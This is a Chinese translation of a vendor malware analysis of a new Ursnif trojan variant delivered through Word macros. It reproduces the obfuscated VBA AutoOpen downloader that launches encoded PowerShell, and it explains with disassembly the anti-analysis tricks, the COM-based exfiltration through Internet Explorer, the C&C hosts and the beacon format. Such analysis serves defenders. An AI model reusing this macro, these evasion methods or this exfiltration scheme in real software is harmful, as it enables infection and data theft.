# 新Ursnif变种在Word传播

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU2MTQwMzMxNA==&mid=2247487234&idx=2&sn=fabd78b4d8820531c8c0525f1ad5d915&chksm=fc780bdfcb0f82c98e9ab188b36460412ea4386fa453b69aae049effeda12148ede40ff4c2ea&scene=126&sessionid=1681404659#rd](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247487234&idx=2&sn=fabd78b4d8820531c8c0525f1ad5d915&chksm=fc780bdfcb0f82c98e9ab188b36460412ea4386fa453b69aae049effeda12148ede40ff4c2ea&scene=126&sessionid=1681404659#rd)

注意：这种威胁正在快速蔓延。分析中，仅从几个样本开始，捕获样本的数量和这个新变体在我们的全球传感器网络中引发的触发数量不断增长。因此，强烈建议组织机构对当前不断扩大的威胁保持警惕。

最近，FortiGuard威胁研究与实验室从野外捕获了许多正在传播Ursnif木马的新变种的word文档。

经过对新变种进行的一些研究，本篇将介绍它在受害者机器上的动作以及它使用的技术。Ursnif木马，也被称为Dreambot，Gozi和ISFB，多年来一直保持着活跃，专注于从受害者的机器窃取信息。

**Word文档样本分析**

![](../Images/087b6db0431461a27c74602d50ef35ee.png)

Figure 1. The Word sample content

这些受感染的Word文档包含恶意VBA代码。在此攻击活动中，Word文档的文件名格式为：“info\_ \[date\] .doc”。此分析中的示例名称为info\_07.25.doc。

当受害者打开Word文档时，它会显示一条安全警告消息（旨在保护MS Word用户免受恶意宏（VBA代码）的攻击）。但是，文档内容欺骗受害者单击“启用内容”按钮，如图1所示。单击该按钮时，将执行恶意VBA代码，因为代码位于打开文档时执行的自动打开序列中。

**恶意代码样本如下：**

**Sub AutoOpen()**

**            Set fPzzMCZTdBHCipC = ymwsrw**

**            Set KiVsBKglbMn = fPzzMCZTdBHCipC.Controls**

**            KKzPMDRPhZsJz = KiVsBKglbMn(2) + KiVsBKglbMn(0)**

**            Set PhFMwPKBcLcsm = VBA.GetObject(KiVsBKglbMn(100 - 90 - 9).Text)**

**            PhFMwPKBcLcsm.Run! KKzPMDRPhZsJz, 0 + 7596**

**End Sub**

从UserForm上的三个控件读取更多代码，名为“ymwsrw”。然后，它将来自控件的text属性的PowerShell代码放在一起并执行它。代码是PowerShell代码。图2中的代码，您可以在其中看到PowerShell代码的转换方式。

![](../Images/0eca07f9600c1b5bd009ce479ccb56c0.png)

Figure 2. Executing the PowerShell code

第一部分是VBA代码生成的原始PowerShell代码。如您所见，它是Base64编码的（-Enc是-EncodedCommand的缩写）。在代码被Base64解码后，代码显示在第二部分中，该部分仍包含Base64编码数据。它继续解码数据，解压缩，以获得图2底部的最终PowerShell代码。

通过最终代码，然后它将URL（带有红色下划线）的文件下载到“$ Env：UserProfile”文件夹中，最后通过调用“\[Diagnostics.Process\] :: STaRt（$ UpwpWW）”启动它。当然，结果可能会有所不同，因为这些捕获的Word示例使用许多不同的URL来下载Ursnif。

无论如何，下载的可执行文件是Ursnif的变体，Word文档样本是Ursnif 下载器。

**开始下载Ursnif**

通过检查下载的文件，我们了解到它是在2019年7月25日编译的。当它启动时，它会将几个动态代码块转储到其内存中并执行它们。其中一个是执行所有Ursnif工作的主要模块。

![](../Images/a74bdcdb81eba440e3c623dad17b2410.png)

Figure 3. Extracted Ursnif Main module

图3中，恶意软件的数据部分显示解压缩的Main模块的文件头。这里有点棘手，因为它没有应该出现在第一个红色矩形中的DOS魔法词“MZ”，也不应该出现在第二个矩形中的PE标题魔法词“PE”。Ursnif删除了这些魔法词以防止它被识别，但Ursnif知道如何在没有它们的情况下加载这个模块。

它继续将PE结构中的每个部分加载到新分配的内存中。然后，它会修复其重定位数据并导入表中包含的API函数。一切准备就绪后，它会调用主模块的OEP（入口点）。这个过程就像打包器一样。

**Ursnif主要模块的反分析**

Ursnif使用一些反分析技术使其难以分析。例如，它隐藏了一些API函数，每次调用它们时都会动态解析，因此静态分析很困难; 主模块中的大多数数据（在PE结构的“.bss”部分中）都是加密的，并且只在运行时解密。我们来看看细节。

Ursnif通过调用API RtlAddVectoredExceptionHandler来注册向量异常处理程序，其第二个参数指向处理函数。因此，当它遇到任何异常时，系统将首先调用此处理函数。图4显示了伪代码。

![](../Images/5e4dd11b7f299c6543a2820a186b402f.png)

Figure 4. Register exception handler function

Ursnif使用异常处理函数来解密“.bss”部分中的数据。为此，它使用“.bss”部分修改内存的内存保护选项，其中加密数据位于PAGE\_NOACCESS（0x1）中。因此，当Ursnif读取此区域中的数据时，会发生访问冲突异常（异常代码C0000005），以便调用异常处理函数。

图5是Ursnif刚刚解密“.bss”部分中的数据时的屏幕截图。此部分的尺寸为1000H。大多数常量字符串和API名称都在这里，它们也在整个Ursnif的生命周期中使用。

![](../Images/d2e68c3811fcf77d80d5042f6fec3cd5.png)

Figure 5. Part of decrypted “.bss” data

主模块中隐藏了许多关键API。当需要调用API时，只需要调用名为“API\_Finder”的函数来动态加载API所属的dll文件，并通过调用LoadLibrary然后调用GetProcAddress来查找其中的API。

字符串中的API名称仅来自具有字符串和偏移量的结构中的解密“.bss”部分。“API\_Finder”可以通过其偏移量找到API名称。以下是使用API\_Finder从“User32.dll”获取API“CloseClipboard”时的ASM代码段。

**000C9D27   sub\_C9D27 proc near **

**000C9D27    mov     eax, offset off\_CC100**

**000C9D2C    jmp     $+5**

**000C9D31**

**000C9D31 loc\_C9D31:**

**000C9D31    push    ecx**

**000C9D32    push    edx**

**000C9D33    push    eax             ; API function index**

**000C9D34    push    offset dword\_CB2F4       ; dll name, 0CB150-> "User32.dll"**

**000C9D39    call    API\_Finder   ;It calls LoadLibrary and GetProcAddress. The API is in eax.**

**000C9D3E    pop     edx**

**000C9D3F    pop     ecx**

**000C9D40    jmp     eax       ; calls the API function**

**000C9D40 sub\_C9D27 endp**

“API\_Finder”从其第二个参数获取API函数索引（此处为0xCC100），“API\_Finder”可以从中计算字符串“CloseClipboard”的偏移量。“API\_Finder”的第一个参数指向具有库名称的结构。“CloseClipboard”的入口点在“eax”中返回，最后调用。

**用一个COM实例发送数据到C&C服务器**

如果您在Ursnif运行时密切关注任务管理器中的进程列表，您会发现有许多“iexplore.exe”进程不时出现和消失。并且“iexplorer.exe”有很多流量。这就是Ursnif从受害者系统发送收集的数据所做的工作。它不会直接创建进程“iexplorer.exe”，而是创建COM（组件对象模型），因为Ursnif通过调用API“CoCreateInstance”来创建COM实例，这是一个隐藏的API函数。这是调用它的ASM代码段。

**\[…\]**

**seg000:000C3E0B                 jz      loc\_C3E98**

**seg000:000C3E11                 push    esi**

**seg000:000C3E12                 push    offset rrid ; {EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B}**

**seg000:000C3E17                 push    4       ; dwClsContext**

**seg000:000C3E19                 push    0       ; pUnkOuter**

**seg000:000C3E1B                 push    offset rclsid ; {0002DF01-0000-0000-C000-000000000046}**

**seg000:000C3E20                 call    ds:CoCreateInstance**

**seg000:000C3E26                 test    eax, eax**

**\[…\]**

第一个证据是这个GUID（全局唯一标识符）：“{0002DF01-0000-0000-C000-000000000046}”，是属于“Internet Explorer”的CLSID（类标识符）。第二个证据是这个接口ID：“{EAB22AC1-30C1-11CF-A7EB-0000C05BAE0B}”，是属于“IWebBrowser”这个接口的。COM对象也可以被“InternetExplorer.Application”创建。

接口“IWebBrowser”使用了各种方法，使您可以使用MS IE浏览器访问诸如GoBack()，GoHome()，Navigate()，Refresh()等网站。COM启动“iexplorer.exe”，然后加载“IWebBrowser”接口，然后可以调用其方法。Ursnif使用Navigate()方法将收集的数据发送到其C＆C服务器，其第一个参数是URL字符串。 

Ursnif在主模块的“.reloc”部分压缩了配置数据。解压缩它会提取图6中所示的数据结构。

![](../Images/0112b1993644f8a2e865225a33b1e5ac.png)

Figure 6. Decompressed configuration data

在底部，您可能会注意到C＆C主机列表包括“microsoft.com”，“update.microsoft.com”，“avast.com”，“cdevinoucathrine.info”，“zcei60houston.club”和“kenovella.club”。这看起来很奇怪。为什么“microsoft”和“avast”的主机列在这里？事实上，这是一种欺骗捕获和分析流量的研究人员的方法。

![](../Images/2e6824a53896598613dfded9cf6520f0.png)

Figure 7. Format of collected information

图7中的代码片段允许Ursnif格式化受害者系统中收集的信息。一个格式化的字符串如下所示：

**soft=3&version=214082&user=0364812000299edca18c7b9e8ed0ab6d&server=12&id=3387&crc=1&uptime=2193**

*   “软”和“版本”是不变的。
    
*   “user”是一种唯一的用户ID。它由四个DWORD组成，这些DWORD是根据受害者的用户名和计算机名的哈希码以及它的CPU ID计算出来的。
    
*   “server”和“id”来自解压缩的配置数据。它们位于主机字符串3387和12之后，如图6所示。  
    
*   “crc”是另一个常数1。
    
*   “正常运行时间”是一个时间值，告诉攻击者自受害者系统启动以来的正常运行时间。
    

Ursnif使用Base64对上述字符串进行编码，然后它将成为URL的一部分。除此之外，它用编码字符串中的十六进制字符串替换了几个字节。（例如：“+”变为“\_2B”，“/”变为“\_2F”。）之后，它会在其中插入一个随机数“/”并添加前缀“/ images /”和后缀“.avi” 使URL看起来正常。

现在，收集的数据几乎已准备好发送到其C＆C服务器。正如之前所说，解压缩配置中有六个主机字符串。Ursnif从中挑选一个主机字符串，并使用主机和上面编码的字符串创建一个完整的URL。它将是方法“IWebBrowser.Navigate（）”的第一个参数。在等待20秒后，它会选择下一个主机字符串。以下是URL的示例，该URL将发送到C＆C服务器。
